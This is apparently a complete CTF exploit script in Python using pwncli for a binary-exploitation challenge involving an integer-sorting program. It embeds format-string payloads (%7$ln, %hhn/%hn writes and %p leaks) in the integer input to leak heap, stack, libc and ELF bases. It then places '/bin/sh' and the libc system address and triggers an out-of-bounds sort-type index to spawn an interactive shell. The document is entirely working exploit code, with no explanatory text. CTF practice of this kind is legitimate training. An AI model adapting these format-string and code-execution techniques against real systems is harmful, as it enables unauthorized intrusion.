#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *
import random

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(count, ints, idx):
    ru(b"How many ints?\n")
    sl(i2b(count))
    ru(b"Input ints (separate by space):\n")
    sl(ints)
    ru(b"Input sort type (1 = forward, 2 = reverse):\n")
    sl(i2b(idx))


length = 0x60
payload_list = [random.randint(1, 0xFFFFFF) for i in range(length)]

off = 4
fmt = strFmt()
payload = b"%7$ln"
payload += fmt.generate_hhn_payload(0x780, 0x98)
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

off = 0x1C
fmt = strFmt()
payload = fmt.generate_hn_payload(0x7B0, 0x327E)
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

off = 0x3C
payload = b"Trying to leak: %p.%8$p.%10$p.%269$p."
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

payload_list = [str(i) for i in payload_list]
cmd(length, " ".join(payload_list).encode(), -9)

ru(b"Tryio leng tak: ")
heap_base = int(ru(b".0x", drop=True), 16) - 0x2E0
stack_base = int(ru(b".0x", drop=True), 16)
libc_base = int(ru(b".0x", drop=True), 16) - libc.sym.printf
elf_base = int(ru(b".", drop=True), 16) - elf.sym.main
lg("libc_base", libc_base)
lg("elf_base", elf_base)
lg("heap_base", heap_base)
lg("stack_base", stack_base)
assert stack_base & 0xFF == 0x20
assert elf_base & 0xF000 == 0x2000


length = 0x60
payload_list = [random.randint(1, 0xFFFFFF) for i in range(length)]
off = 4
payload = b"/bin/sh\x00"
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

off = 0x20
payload = p64(libc_base + libc.sym.system)
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

payload_list = [str(i) for i in payload_list]
cmd(
    length,
    " ".join(payload_list).encode(),
    (((heap_base + 0x430 + 0x20) - (elf_base + 0x4010)) // 8) + 1,
)

ia()